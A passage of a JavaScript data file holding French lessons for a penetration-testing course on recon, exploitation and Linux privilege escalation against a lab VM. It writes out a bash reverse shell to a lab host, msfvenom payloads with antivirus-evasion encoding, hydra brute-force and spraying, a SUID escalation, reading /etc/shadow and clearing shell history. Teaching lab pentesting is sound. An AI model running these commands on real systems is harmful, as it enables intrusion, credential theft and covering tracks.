              `Nmap scan report for 192.168.56.10\nHost is up (0.00022s latency).\nPORT     STATE SERVICE     VERSION\n21/tcp   open  ftp         vsftpd 2.3.4\n22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1\n80/tcp   open  http        Apache httpd 2.2.8\n139/tcp  open  netbios-ssn Samba smbd 3.X\n445/tcp  open  netbios-ssn Samba smbd 3.X`
            ),
            h("Les erreurs à éviter"),
            list(
              "Oublier -p- : on rate les ports atypiques (le fameux 6200 du backdoor vsftpd).",
              "Lancer -sV sur tous les ports au lieu des ports ouverts : très lent.",
              "Oublier -oA : sans sauvegarde, la preuve disparaît.",
              "Utiliser -sS sans root : le scan échoue ou passe en connect scan."
            ),
            callout(
              "L'ordre des options raconte la méthode : -sn pour trouver, -p- pour cartographier, -sV sur les ports ouverts pour identifier, -sC/--script vuln pour analyser. Et -oA partout.",
              "tip"
            ),
            callout(
              "Un scan nmap envoie des paquets vers la cible : c'est de la reconnaissance active, détectable et bruyante. Il s'effectue uniquement sur tes machines ou des cibles couvertes par une autorisation écrite.",
              "danger"
            )
          ]
        },
        {
          id: "ptm-lecon-11",
          title: "Énumération web : gobuster, ffuf et nikto",
          type: "exercise",
          duration: "14 min",
          blocks: [
            h("La vitrine cache la réserve"),
            p(
              "Le site web est la vitrine du magasin. L'énumération applicative, c'est ouvrir toutes les portes de service : l'entrée de livraison, la réserve, le bureau de l'administrateur. Le propriétaire a verrouillé la vitrine, mais parfois pas la réserve."
            ),
            h("1. Identifier les technologies"),
            p(
              "Avant de fouiller, on sait à quoi on a affaire : le serveur web, le langage, le framework, le CMS. Les en-têtes HTTP, le code HTML et des outils dédiés répondent."
            ),
            code(
              `whatweb http://192.168.56.10\nnmap --script http-enum -p 80 192.168.56.10`
            ),
            h("2. Énumérer les répertoires avec gobuster"),
            p(
              "gobuster teste des centaines de chemins candidats contre le serveur, à partir d'une wordlist. Chaque chemin qui répond est une page cachée potentielle : admin, backup, phpmyadmin..."
            ),
            code(
              `gobuster dir -u http://192.168.56.10 -w /usr/share/wordlists/dirb/common.txt -t 20`
            ),
            h("3. Fuzzer avec ffuf"),
            p(
              "ffuf fait la même chose en plus rapide et plus flexible : chemins, paramètres, sous-domaines virtuels. Le mot FUZZ marque l'emplacement où la wordlist est injectée."
            ),
            code(
              `ffuf -w /usr/share/wordlists/dirb/common.txt -u http://192.168.56.10/FUZZ`
            ),
            h("4. Les fichiers qui traînent"),
            p(
              "robots.txt indique ce que les robots ne doivent pas visiter : c'est une liste de pistes offerte par le serveur lui-même. Les fichiers .bak, .old, .zip, .sql sont des trouvailles classiques."
            ),
            code(
              `curl -s http://192.168.56.10/robots.txt`
            ),
            h("5. nikto, le scanner bavard"),
            p(
              "nikto scanne automatiquement les failles web basiques et les fichiers dangereux. Il est très bavard et produit beaucoup de faux positifs : on l'utilise comme piste, jamais comme vérité."
            ),
            code(
              `nikto -h http://192.168.56.10`
            ),
            h("Interpréter les résultats"),
            list(
              "Un code 200 : la ressource existe. Un 403 : elle existe mais est protégée. Un 404 : rien.",
              "Certains serveurs répondent 200 sur tout : vérifie la taille des réponses.",
              "Croiser gobuster et les scripts nmap : les outils se complètent.",
              "Ne jamais exécuter les fichiers trouvés ni télécharger de données personnelles."
            ),
            callout(
              "Vérifie chaque réponse avant de conclure : statut, taille, contenu. Un répertoire « trouvé » qui renvoie le même HTML que la page d'accueil est un faux positif.",
              "warning"
            ),
            callout(
              "Le fuzzing web envoie des centaines de requêtes vers le serveur : c'est de l'activité détectable, et potentiellement destructrice si une page sensible répond mal. En labo uniquement, ou dans le périmètre autorisé par les RoE.",
              "danger"
            )
          ]
        },
        {
          id: "ptm-lecon-12",
          title: "Énumération de services : bannières, SMB, SSH",
          type: "exercise",
          duration: "14 min",
          blocks: [
            h("Chaque service est une porte"),
            p(
              "Après le scan, on creuse chaque port ouvert : que dit le service, que permet-il, quels comptes ou ressources expose-t-il ? L'énumération de services transforme une liste de ports en une liste de cibles."
            ),
            h("Les bannières"),
            p(
              "Beaucoup de services se présentent en une ligne quand on les salue. Ces bannières donnent souvent le nom et la version exacts : la matière première de l'analyse des vulnérabilités."
            ),
            code(
              `nc -nv 192.168.56.10 21\nnmap -sV -p 21 192.168.56.10`
            ),
            h("Le FTP"),
            p(
              "Sur un FTP, on teste l'accès anonyme (login anonymous), on liste les fichiers, et on note ce qui est exposé. Un FTP anonyme en écriture est un constat immédiat."
            ),
            code(
              `ftp 192.168.56.10\nls -la\nexit`
            ),
            h("Le SMB"),
            p(
              "SMB (ports 139/445) sert au partage de fichiers Windows et à l'authentification. Les outils SMB listent les partages et récupèrent les informations du système : versions, utilisateurs, sessions."
            ),
            code(
              `smbclient -L //192.168.56.10\nsmbmap -H 192.168.56.10\nenum4linux 192.168.56.10`
            ),
            h("Le SSH"),
            p(
              "SSH expose une bannière avec la version du serveur. Une version ancienne est un indice précieux. On peut aussi tester des comptes par défaut (en labo) :"
            ),
            code(
              `ssh -o StrictHostKeyChecking=no msfadmin@192.168.56.10`
            ),
            h("Ce qu'on garde de chaque service"),
            list(
              "Le service, le port, et la version exacte (avec la bannière qui le prouve).",
              "Les options exposées : accès anonyme, partages listables, comptes par défaut.",
              "Le potentiel : à quoi ce service pourrait servir dans une attaque.",
              "Les captures des sorties pour le rapport."
            ),
            callout(
              "La version est le lien entre le port et la faille : sans version exacte, pas de CVE. Note toujours la bannière brute dans tes notes.",
              "tip"
            ),
            callout(
              "Tester des comptes par défaut, se connecter à un partage ou ouvrir une session SSH, ce sont des actions d'exploitation : elles ne se font que sur des machines de labo ou dans le périmètre signé.",
              "danger"
            )
          ]
        },
      ],
    },
    {
      id: "ptm-module-3",
      title: "Analyse, exploitation et post-exploitation",
      lessons: [
        {
          id: "ptm-lecon-13",
          title: "Analyse des vulnérabilités : du port à la CVE",
          type: "theory",
          duration: "13 min",
          blocks: [
            h("Du port à la faille"),
            p(
              "L'analyse des vulnérabilités croise les informations de la recon (services, versions, configurations) avec les bases de vulnérabilités connues. C'est le moment où l'on passe de « il y a un port 21 ouvert » à « vsftpd 2.3.4 présente un backdoor connu, un exploit existe »."
            ),
            h("L'analogie de la serrure"),
            p(
              "Tu as la liste des portes de la maison (la recon). Maintenant tu vérifies pour chaque porte si la serrure a un défaut documenté, si quelqu'un a déjà publié une méthode pour l'ouvrir. L'analyse des vulnérabilités, c'est la consultation des catalogues de serrures."
            ),
            h("La démarche en cinq temps"),
            list(
              "1. Lister les services et leurs versions exactes (recon).",
              "2. Chercher les vulnérabilités connues pour chaque version (CVE, searchsploit).",
              "3. Confirmer à la main : un scanner automatique fait des faux positifs.",
              "4. Contextualiser : la faille est-elle accessible ? Est-elle dans le scope ?",
              "5. Prioriser : score CVSS, exploitabilité réelle, valeur de la cible."
            ),
            h("Le croisement service → CVE"),
            code(
              `21/tcp  open  ftp  vsftpd 2.3.4\n\n→ recherche : vsftpd 2.3.4 backdoor\n→ CVE-2011-2523\n→ exploit disponible (Metasploit)\n→ sévérité : accès root sans authentification`
            ),
            h("Les scanners automatiques"),
            p(
              "nmap --script vuln et les scanners dédiés (Nessus, OpenVAS) produisent une première liste de vulnérabilités. Ils sont rapides et larges, mais font beaucoup de faux positifs. Chaque alerte doit être confirmée à la main."
            ),
            code(
              `sudo nmap --script vuln -p 21,22,80,445 192.168.56.10`
            ),
            h("La confirmation manuelle"),
            p(
              "Demander la page, reproduire le comportement, comparer les réponses : c'est l'œil humain qui sépare le vrai constat du bruit. Une alerte non confirmée n'entre pas dans le rapport, ou bien elle est marquée « à vérifier »."
            ),
            h("Le classement des candidats"),
            list(
              "Exploitable et prouvable : le candidat idéal pour la phase d'exploitation.",
              "Configuration faible (mot de passe par défaut, version obsolète) : à documenter, à tester.",
              "Faille théorique non accessible : notée comme suspectée, pas comme prouvée.",
              "Hors scope : documentée sans être touchée."
            ),
            callout(
              "Ne jamais exploiter une vulnérabilité qui n'a pas été confirmée, et toujours documenter la version exacte qui a permis l'identification : c'est elle qui rend le constat reproductible.",
              "warning"
            ),
            callout(
              "L'analyse s'appuie sur les données de recon, donc sur des machines autorisées. Lancer des scripts de vulnérabilités sur une cible tierce reste une action intrusive : article 323-1 du code pénal sans autorisation.",
              "danger"
            )
          ]
        },
        {
          id: "ptm-lecon-14",
          title: "Noter la gravité avec CVSS",
          type: "theory",
          duration: "12 min",
          blocks: [
            h("Noter sans approximation"),
            p(
              "CVSS (Common Vulnerability Scoring System) est une échelle normalisée de 0 à 10 pour mesurer la gravité technique d'une vulnérabilité. La version actuelle est la CVSS v3.1. Elle donne un langage commun : « critique », « élevé », « moyen » sont définis par des bornes précises."
            ),
            h("L'analogie du barème médical"),
            p(
              "CVSS, c'est le barème de gravité d'un accident : on note la nature de la blessure (impact), la facilité avec laquelle l'accident arrive (exploitabilité), si le blessé devait être là (privilèges requis, interaction utilisateur). Le médecin décide ensuite, avec le contexte, qui opérer en premier."
            ),
            h("Les métriques du base score"),
            code(
              `AV  Attack Vector        N > A > L > P   (le plus grave en premier)\nAC  Attack Complexity    L > H\nPR  Privileges Required  N > L > H\nUI  User Interaction     N > R\nS   Scope                C > U\nC   Confidentialité      H > L > N\nI   Intégrité            H > L > N\nA   Disponibilité        H > L > N`
            ),
            h("Les seuils de sévérité"),
            code(
              `0.0       None\n0.1-3.9   Low\n4.0-6.9   Medium\n7.0-8.9   High\n9.0-10.0  Critical`
            ),
            h("Un exemple pas à pas"),
            p(
              "Une exécution de code à distance sur un service exposé à Internet, sans authentification, sans interaction utilisateur, avec impact total en confidentialité, intégrité et disponibilité : c'est la configuration la plus grave possible. Les métriques : AV:N, AC:L, PR:N, UI:N, S:U, C:H, I:H, A:H."
            ),
            code(
              `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H   →   9.8 (Critical)`
            ),
            h("CVSS n'est pas le risque"),
            p(
              "CVSS mesure la gravité technique, pas le risque réel pour l'entreprise. Une faille 9.8 sur un serveur de test isolé est un risque faible ; une faille 6.0 sur le site de production exposé peut être le risque n°1. Le rapport fournit toujours le score ET le contexte métier."
            ),
            h("Les bonnes pratiques"),
            list(
              "Remplir les métriques avec la situation réelle, pas avec l'option pessimiste.",
              "Fournir le score et la chaîne vectorielle dans le rapport.",
              "Citer la version de CVSS utilisée (v3.1).",
              "Compléter CVSS par le contexte : exposition, valeur de l'actif, impact métier."
            ),
            callout(
              "Le calculateur officiel se trouve sur www.first.org/cvss/calculator/3.1. Inutile de retenir la formule par cœur : il faut savoir choisir les bonnes métriques.",
              "tip"
            ),
            callout(
              "Un score CVSS ne se remplit pas au hasard : des métriques inexactes produisent une note mensongère, et un rapport mensonger nuit à toute la mission. Sois rigoureux.",
              "warning"
            )
          ]
        },
        {
          id: "ptm-lecon-15",
          title: "searchsploit et la recherche d'exploits",
          type: "exercise",
          duration: "12 min",
          blocks: [
            h("La bibliothèque des exploits"),
            p(
              "Exploit-DB est la base de référence des exploits publics, avec des milliers d'outils liés à des vulnérabilités identifiées. searchsploit la parcourt en local, hors ligne, en une seconde. C'est le pont entre « une CVE existe » et « voici comment la prouver »."
            ),
            h("La recherche"),
            p(
              "On cherche par nom de service ou par version. Commence par le service, puis affines avec la version exacte trouvée à la recon."
            ),
            code(
              `searchsploit vsftpd 2.3.4\nsearchsploit vsftpd\nsearchsploit unrealircd 3.2.8.1`
            ),
            h("Lire une entrée"),
            p(
              "Chaque entrée a un numéro (EDB-ID), un titre, un chemin vers le fichier. L'option -p affiche le chemin exact, -x ouvre le fichier pour le lire. Lire avant d'exécuter, toujours."
            ),
            code(
              `searchsploit -p 49757\nsearchsploit -x 49757`
            ),
            h("De la recherche à la vérification"),
            code(
              `searchsploit vsftpd 2.3.4 | grep -E "backdoor"`
            ),
            h("Se méfier des exploits publics"),
            list(
              "1. Lire le code de l'exploit avant de l'exécuter : il peut contenir un cheval de Troie.",
              "2. Vérifier que la version du service correspond à celle de l'exploit.",
              "3. Tester l'exploit en labo d'abord, si possible.",
              "4. Ne jamais exécuter un exploit destructeur « juste pour voir »."
            ),
            h("La chaîne complète"),
            code(
              `nmap -sV  →  searchsploit  →  CVE  →  exploit / Metasploit / POC`
            ),
            h("Ce qu'on garde"),
            list(
              "La référence EDB-ID et la CVE associée, pour le rapport.",
              "Le chemin de l'exploit et sa date.",
              "La version du service qui a permis l'identification.",
              "La décision : exploiter en labo, ou documenter sans exécuter."
            ),
            callout(
              "Le réflexe pro : chercher d'abord la version exacte, vérifier l'exploit sur la bonne plateforme, puis le lire avant de le lancer. L'exploit n'est pas magique, c'est un outil qui se vérifie.",
              "tip"
            ),
            callout(
              "Les exploits publics sont conçus pour compromettre des machines. Les exécuter en dehors d'un labo isolé ou du périmètre autorisé est une intrusion en soi, même si l'exploit a été « trouvé sur Internet ».",
              "danger"
            )
          ]
        },
        {
          id: "ptm-lecon-16",
          title: "Exploitation : Metasploit, msfvenom et obfuscation basique",
          type: "exercise",
          duration: "15 min",
          blocks: [
            h("Le framework qui structure l'exploitation"),
            p(
              "Metasploit centralise des milliers de modules : exploits, auxiliaires (scanners, énumération), payloads (charges utiles), post-modules. L'interface principale est msfconsole. C'est l'outil standard de l'industrie — mais pas une baguette magique : il faut comprendre ce qu'il fait et vérifier ses résultats."
            ),
            h("L'analogie du serrurier"),
            p(
              "Metasploit, c'est la boîte à outils complète du serrurier : chaque serrure connue a sa clé (l'exploit), chaque clé a un guide (le payload). Tu choisis la clé, tu règles la poignée (RHOSTS), tu tournes. Mais une boîte à outils ne remplace pas le serrurier."
            ),
            h("Démarrer et chercher"),
            code(
              `msfconsole\nsearch vsftpd\nsearch unrealircd`
            ),
            h("Configurer un module"),
            p(
              "On sélectionne un module, on affiche ses options, on règle la cible, puis on exécute. Toujours montrer les options avant de lancer : un RHOSTS oublié, c'est un exploit lancé sur rien."
            ),
            code(
              `use exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS 192.168.56.10\nshow options\nrun`
            ),
            h("Les sessions"),
            p(
              "Une session est un accès obtenu. On les liste, on bascule entre elles, on en met en arrière-plan. C'est le centre de contrôle de la post-exploitation."
            ),
            code(
              `sessions -l\nsessions -i 1\nbackground`
            ),
            h("Générer un payload avec msfvenom"),
            p(
              "msfvenom crée des payloads sur mesure, hors de msfconsole : un binaire ELF, un fichier Windows, un one-liner. Le payload reverse se connecte à ton poste sur LHOST:LPORT."
            ),
            code(
              `msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.56.1 LPORT=4444 -f elf -o shell.elf`
            ),
            h("L'obfuscation basique (en labo uniquement)"),
            p(
              "Les antivirus et EDR détectent les payloads génériques. L'encodeur réécrit le payload pour échapper aux signatures les plus simples. C'est une technique de laboratoire : en engagement réel, l'évasion est le métier du red team."
            ),
            code(
              `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f elf -o payload.elf`
            ),
            h("Les bonnes pratiques"),
            list(
              "Vérifier que le module et la version du service correspondent.",
              "Toujours show options avant run.",
              "Comprendre le payload : reverse ou bind, quel port, quel hôte.",
              "Confirmer l'accès obtenu : id, whoami, sysinfo.",
              "Isoler les machines en réseau host-only : Metasploit est très bruyant."
            ),
            callout(
              "Un exploit qui « réussit » sans rien donner n'est pas une preuve : confirme toujours l'accès avec id ou whoami avant de conclure, et capture la sortie.",
              "tip"
            ),
            callout(
              "Metasploit est un outil d'exploitation : chaque module lancé est une tentative d'intrusion. Labo isolé ou autorisation écrite obligatoires, sans exception.",
              "danger"
            )
          ]
        },
        {
          id: "ptm-lecon-17",
          title: "Exploitation manuelle et force brute : hydra",
          type: "exercise",
          duration: "14 min",
          blocks: [
            h("Quand Metasploit n'est pas là"),
            p(
              "Il faut savoir se passer du framework : un shell se récupère avec netcat, une connexion se teste avec hydra. L'outil s'oublie, la technique reste."
            ),
            h("Le reverse shell avec netcat"),
            p(
              "Le but de l'exploitation est d'obtenir un shell sur la cible. Dans un reverse shell, c'est la cible qui se connecte vers ton poste : elle peut sortir, même si un pare-feu bloque les entrées. C'est la technique la plus utilisée."
            ),
            code(
              `# Terminal 1 — ton poste : écouter\nnc -lvnp 4444`
            ),
            code(
              `# Terminal 2 — sur la cible, via une faille (injection de commande)\nbash -i >& /dev/tcp/192.168.56.1/4444 0>&1`
            ),
            h("Stabiliser le shell"),
            p(
              "Le shell obtenu est souvent « sale » : pas de terminal complet, pas de clear, les éditeurs refusent de s'ouvrir. On le stabilise en créant un pseudo-terminal et en réglant le terminal local."
            ),
            code(
              `python3 -c 'import pty; pty.spawn("/bin/bash")'\nexport TERM=xterm\n# Ctrl+Z puis :\nstty raw -echo; fg\nstty rows 40 cols 80`
            ),
            h("La force brute avec hydra"),
            p(
              "hydra teste des combinaisons utilisateur/mot de passe directement sur un service. L'analogie : sonner à la porte en essayant toutes les clés du trousseau, une par une, devant la caméra. Ça peut marcher, mais ça fait du bruit."
            ),
            code(
              `sudo gunzip /usr/share/wordlists/rockyou.txt.gz\nhydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.10 -t 4 -f -o hydra-ssh.txt`
            ),
            h("Le password spraying"),
            p(
              "Variante plus discrète : peu de mots de passe courants sur beaucoup de comptes, au lieu de beaucoup de mots de passe sur un compte. Elle évite de verrouiller un compte et passe sous le radar de la détection."
            ),
            code(
              `hydra -L users.txt -p "MotDePasse1" ssh://192.168.56.10 -t 4 -f -o spray-ssh.txt`
            ),
            h("Les garde-fous"),
            list(
              "Vérifier que le bruteforce est autorisé dans les RoE.",
              "-t modéré (4 à 8 tâches), -f pour s'arrêter au premier succès.",
              "Se méfier du rate limiting et du verrouillage de comptes.",
              "Sauvegarder le résultat avec -o : c'est une preuve."
            ),
            callout(
              "Dans un vrai engagement, le bruteforce est souvent limité ou interdit : il peut verrouiller des comptes de production, un dégât réel. On commence par les combinaisons probables avant les longues wordlists.",
              "warning"
            ),
            callout(
              "hydra lance des milliers de connexions vers la cible : c'est l'attaque la plus bruyante qui soit, et une intrusion à part entière sans autorisation. Labo et RoE uniquement.",
              "danger"
            )
          ]
        },
        {
          id: "ptm-lecon-18",
          title: "Post-exploitation : privesc Linux et mouvement latéral",
          type: "exercise",
          duration: "15 min",
          blocks: [
            h("Après l'accès, le vrai impact"),
            p(
              "La post-exploitation regroupe tout ce qui suit le premier accès : consolider le shell, énumérer le système, escalader les privilèges, collecter des preuves, éventuellement se déplacer. Un accès bas niveau ne vaut rien sans la preuve de ce qu'il permet."
            ),
            h("L'analogie du livreur"),
            p(
              "Tu es entré dans l'immeuble comme livreur (utilisateur limité). L'escalade, c'est trouver une clé qui ouvre le local technique, puis celle du bureau du directeur, puis celle du coffre. Souvent, une seule mauvaise configuration ouvre tout."
            ),
            h("1. Consolider et s'identifier"),
            p(
              "Un shell stabilisé, puis des commandes d'identité : qui suis-je, quel noyau, quel réseau ?"
            ),
            code(
              `id\nwhoami\nuname -a\ncat /etc/os-release\nip a`
            ),
            h("2. L'énumération automatique"),
            p(
              "linpeas.sh balaie le système et signale les mauvaises configurations classiques. On le transfère sur la cible depuis un serveur HTTP local."
            ),
            code(
              `curl -L http://192.168.56.1:8000/linpeas.sh -o linpeas.sh && chmod +x linpeas.sh\n./linpeas.sh | tee linpeas.out`
            ),
            h("3. Les familles classiques de failles"),
            list(
              "sudo : des commandes exécutables en root sans mot de passe (sudo -l).",
              "SUID : des binaires qui tournent avec les droits du propriétaire (souvent root).",
              "cron : des tâches root qui exécutent un script modifiable.",
              "Capabilities : des droits détachés accordés à des binaires (getcap).",
              "Noyau : une version vulnérable (uname -a), exploit en dernier recours.",
              "Fichiers sensibles : historiques, configs, /etc/passwd lisible, sauvegardes."
            ),
            h("Vérifier sudo"),
            code(
              `sudo -l`
            ),
            h("Chercher les SUID"),
            code(
              `find / -perm -4000 -type f 2>/dev/null`
            ),
            h("Regarder les crontab"),
            code(
              `cat /etc/crontab\nls -la /etc/cron.d/`
            ),
            h("Exploiter avec GTFOBins"),
            p(
              "GTFOBins est la référence des binaires abusables. Pour chaque binaire SUID ou sudo, il donne la technique exacte. Exemple classique, le binaire find en SUID :"
            ),
            code(
              `/usr/bin/find . -exec /bin/sh -p \\; -quit`
            ),
            h("La preuve"),
            code(
              `id\nwhoami\ncat /root/flag.txt`
            ),
            h("Le mouvement latéral"),
            p(
              "Avec un accès sur une machine, on peut utiliser cette machine comme tremplin vers le réseau interne : redirections de ports, proxychains, socat. Cette action est presque toujours soumise à accord écrit : c'est elle qui élargit le périmètre réel."
            ),
            code(
              `ssh -L 8080:10.0.0.5:80 user@192.168.56.10`
            ),
            h("Le nettoyage"),
            list(
              "Supprimer les fichiers déposés (linpeas, payloads, scripts).",
              "Fermer les sessions et les écouteurs.",
              "Vérifier que les services tournent comme avant.",
              "Noter tout ce qui a été modifié, pour le rapport."
            ),
            callout(
              "Chaque étape se documente : la commande exacte, la sortie, la capture. L'escalade de privilèges doit être reproductible dans le rapport, sinon elle n'est pas crédible.",
              "tip"
            ),
            callout(
              "La post-exploitation s'exerce exclusivement sur des machines de labo. Lire /etc/shadow, tester des SUID ou pivoter vers d'autres machines sur une cible tierce est une intrusion au sens de l'article 323-1 du code pénal.",
              "danger"
            )
          ]
        },
      ],
    },
    {
      id: "ptm-module-4",
      title: "Méthodologie complète et reporting",
      lessons: [
        {
          id: "ptm-lecon-19",
          title: "Monter son lab de pentest",
          type: "exercise",
          duration: "14 min",
          blocks: [
            h("L'environnement d'entraînement"),
            p(
              "Tout ce que tu as appris se pratique sur un lab : une machine d'attaque (Kali Linux) et une machine vulnérable (Metasploitable 2 ou équivalent), reliées sur un réseau isolé. C'est ton terrain de jeu à toi, où chaque commande est légale et sans conséquence."
            ),
            h("Kali Linux, la machine d'attaque"),
            p(
              "Kali embarque les outils du métier : nmap, hydra, john, hashcat, gobuster, ffuf, nikto, Metasploit, netcat. Sur une autre distribution, on les installe un par un."
            ),
            code(
              `sudo apt update && sudo apt install -y nmap hydra john hashcat gobuster ffuf nikto metasploit-framework netcat-openbsd`
            ),
            h("La machine cible : Metasploitable 2"),
            p(
              "Metasploitable 2 est une VM Linux volontairement truffée de failles, téléchargée depuis le site officiel de VulnHub. Elle est pensée pour l'entraînement : c'est la cible parfaite pour ce cours."
            ),
            h("Le réseau host-only"),
            p(
              "Le réseau host-only de VirtualBox relie uniquement tes VM entre elles : aucun accès Internet, aucune fuite vers le réseau réel. C'est l'isolation qui rend le lab légal et sûr."
            ),
            code(
              `192.168.56.1   →  ton poste Kali\n192.168.56.10  →  la cible vulnérable`
            ),
            h("Le contrat fictif"),
            p(
              "Comme dans un vrai engagement, tu rédiges d'abord le cadre fictif. C'est l'exercice n°1 : la méthode commence toujours par le papier."
            ),
            code(
              `Scope : 192.168.56.10\nPériode : 1 semaine\nTechniques autorisées : scan, énumération, exploitation, privesc\nInterdites : destruction, exfiltration, pivot hors périmètre\nContact d'urgence : moi-même (labo isolé)`
            ),
            h("Le dossier de preuves"),
            p(
              "Avant de commencer, tu prépares un dossier pour les notes, les sorties et les captures. Le rapport s'écrit au fil de l'eau."
            ),
            code(
              `mkdir -p ~/pentest/preuves\nmkdir -p ~/pentest/scans\necho "Engagement labo - démarrage" > ~/pentest/notes.md`
            ),
            h("Ce qu'il faut retenir"),
            list(
              "Le lab est ton droit d'entraînement : tout ce qui s'y passe est légal, tout ce qui en sort doit rester dedans.",
              "La cible se télécharge depuis les sources officielles (VulnHub, plateformes de formation).",
              "Le réseau host-only isole le lab du monde réel.",
              "Le contrat fictif et le dossier de preuves s'écrivent avant la première commande."
            ),
            callout(
              "Prends l'habitude de noter dès maintenant : chaque commande, chaque sortie, chaque capture horodatée. C'est la discipline qui fera la qualité de tes rapports.",
              "tip"
            ),
            callout(
              "Ne jamais installer une VM vulnérable sur un réseau où elle peut être atteinte de l'extérieur : une Metasploitable sur le Wi-Fi de la maison est une cible pour le voisinage. Réseau host-only uniquement.",
              "danger"
            )
          ]
        },
        {
          id: "ptm-lecon-20",
          title: "Méthodologie guidée (1/2) : recon et énumération",
          type: "exercise",
          duration: "16 min",
          blocks: [
            h("La mission"),
            p(
              "Voici le scénario : tu as signé un contrat sur la machine 192.168.56.10 (ta VM de labo). Tu ne connais rien d'elle. L'objectif est d'aller de bout en bout, phase par phase, comme dans un vrai engagement. Cette leçon couvre le cadrage, la recon et l'énumération."
            ),
            h("Étape 1 — le cadre"),
            list(
              "Contrat fictif signé (scope, horaires, techniques autorisées).",
              "Dossier de preuves prêt (notes, scans, captures).",
              "Rappel : quoi que trouve la suite, on reste dans le scope."
            ),
            h("Étape 2 — la découverte"),
            p(
              "On cherche les hôtes vivants du périmètre avant de scanner en profondeur."
            ),
            code(
              `sudo nmap -sn 192.168.56.0/24`
            ),
            h("Étape 3 — le scan complet"),
            p(
              "On scanne les 65 535 ports TCP de la cible, en sauvegardant. On note les ports atypiques : c'est souvent là que se cache la faille."
            ),
            code(
              `sudo nmap -Pn -sS -p- --min-rate 1000 192.168.56.10 -oA scan-all`
            ),
            h("Étape 4 — les services"),
            p(
              "On identifie services et versions sur les ports ouverts, avec les scripts par défaut."
            ),
            code(
              `sudo nmap -Pn -sV -sC -p 21,22,25,80,139,445,6667,6200 192.168.56.10 -oA scan-services`
            ),
            h("Étape 5 — l'énumération web"),
            p(
              "Le port 80 répond : on fouille les répertoires cachés. Chaque chemin trouvé est noté avec son statut."
            ),
            code(
              `gobuster dir -u http://192.168.56.10 -w /usr/share/wordlists/dirb/common.txt -t 20`
            ),
            h("Étape 6 — la synthèse de la phase"),
            code(
              `PORT   SERVICE      VERSION\n21     ftp          vsftpd 2.3.4\n22     ssh          OpenSSH 4.7p1\n80     http         Apache httpd 2.2.8\n139/445 smb        Samba smbd 3.X\n6667   irc          UnrealIRCd 3.2.8.1\n6200   inconnu      (à identifier)\n\n→ pistes : vsftpd, Samba, UnrealIRCd, port 6200 suspect`
            ),
            h("Ce qu'il faut retenir"),
            list(
              "Chaque commande s'accompagne de -oA ou d'une sortie sauvegardée : la preuve existe déjà.",
              "Les ports atypiques sont notés : ils sont les futurs angles d'attaque.",
              "On ne passe à l'analyse qu'avec une cartographie complète."
            ),
            callout(
              "La phase de recon produit l'inventaire des actifs. Sans cartographie complète (-p-, -sV), l'analyse de la suite sera aveugle : c'est le piège n°1 des débutants.",
              "tip"
            ),
            callout(
              "Toutes ces commandes s'exécutent sur la VM de ton lab isolé. Sur un réseau réel sans autorisation, le scan complet est déjà une intrusion.",
              "danger"
            )
          ]
        },
        {
          id: "ptm-lecon-21",
          title: "Méthodologie guidée (2/2) : exploitation, post-exploitation et nettoyage",
          type: "exercise",
          duration: "16 min",
          blocks: [
            h("Repartons de la synthèse"),
            p(
              "La recon a donné des candidats : vsftpd 2.3.4, Samba 3.X, UnrealIRCd 3.2.8.1 et un port 6200 inconnu. On enchaîne l'analyse, l'exploitation, la post-exploitation et le nettoyage."
            ),
            h("Étape 7 — l'analyse des vulnérabilités"),
            p(
              "Pour chaque service, on cherche les vulnérabilités connues. searchsploit répond immédiatement pour les deux premiers."
            ),
            code(
              `searchsploit vsftpd 2.3.4\nsearchsploit unrealircd 3.2.8.1`
            ),
            h("Étape 8 — l'exploitation"),
            p(
              "On choisit le candidat le plus simple : le backdoor vsftpd, exploitable via Metasploit. On obtient un accès, on le vérifie, on capture."
            ),
            code(
              `msfconsole\nuse exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS 192.168.56.10\nrun\nid`
            ),
            h("Étape 9 — la post-exploitation"),
            p(
              "Avec l'accès, on identifie le système, on collecte les preuves (identifiants, hashs) et on documente l'impact. Sur cette VM, le backdoor donne root : la machine est entièrement compromise."
            ),
            code(
              `id\ncat /etc/shadow\nfind / -perm -4000 -type f 2>/dev/null`
            ),
            h("Étape 10 — le nettoyage"),
            p(
              "On supprime les fichiers déposés et on ferme les sessions. La cible doit se retrouver dans l'état où on l'a trouvée."
            ),
            code(
              `rm /tmp/*.sh\nhistory -c\nexit`
            ),
            h("Étape 11 — les preuves"),
            list(
              "La commande exacte de chaque action et sa sortie brute.",
              "Les captures horodatées de l'accès obtenu (id, whoami).",
              "La version exacte des services qui ont permis l'identification.",
              "Le POC complet, reproductible par l'équipe du client."
            ),
            h("Ce qu'il faut retenir"),
            list(
              "La méthode n'autorise jamais un dérapage : on prouve, on documente, on nettoie.",
              "Le nettoyage fait partie de l'engagement, pas une option.",
              "Les preuves se collectent pendant le test, pas après."
            ),
            callout(
              "Le chemin complet tient en une page : scan → searchsploit → exploit → preuve → nettoyage. C'est cette discipline que les certifications et les clients évaluent.",
              "tip"
            ),
            callout(
              "L'exploitation d'un service, même avec un framework « propre », est une intrusion sur toute cible non autorisée. Ton lab isolé ou ton contrat signé, rien d'autre.",
              "danger"
            )
          ]
        },
        {
          id: "ptm-lecon-22",
          title: "Analyse des risques et contre-mesures",
          type: "theory",
          duration: "13 min",
          blocks: [
            h("De la faille au risque métier"),
            p(
              "Un rapport de pentest ne s'arrête pas à la liste des failles. Il doit aider le client à comprendre ce que ces failles signifient pour son activité, et ce qu'il doit faire. C'est le travail d'analyse des risques et de recommandation des contre-mesures."
            ),
            h("Risque = probabilité × impact"),
            p(
              "Le risque est le produit de deux facteurs : la probabilité qu'une menace exploite une faille, et l'impact que l'exploitation aurait sur l'entreprise. Deux failles au score CVSS identique peuvent avoir des risques très différents selon le contexte : exposition, valeur de l'actif, données traitées, dépendance métier."
            ),
            h("La matrice de risque"),
            code(
              `Impact\\Probabilité   Faible      Moyen       Élevé\nÉlevé            moyen       élevé       critique\nMoyen            faible      moyen       élevé\nFaible           faible      faible      moyen`
            ),
            h("Les contre-mesures en trois familles"),
            list(
